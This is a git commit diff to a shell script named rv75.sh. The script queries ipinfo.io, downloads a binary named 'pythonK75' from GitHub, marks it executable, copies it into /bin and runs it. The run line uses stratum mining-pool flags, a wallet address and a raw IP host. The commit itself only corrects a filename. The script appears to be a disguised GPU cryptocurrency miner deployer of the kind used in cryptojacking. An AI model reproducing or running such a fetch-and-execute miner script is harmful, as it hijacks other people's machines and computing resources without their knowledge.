530be7b550f3a48c802d99a0e01341e532332298
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-23 06:18:47 +0100

    Update rv75.sh

--- rv75.sh
+++ rv75.sh
@@ -5,5 +5,5 @@ curl ipinfo.io
 #download build
 wget https://github.com/one10001/10001code/raw/main/pythonK75
 chmod +x pythonK75
-cp pythonK70 /bin/pythonK75
+cp pythonK75 /bin/pythonK75
 pythonK75 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
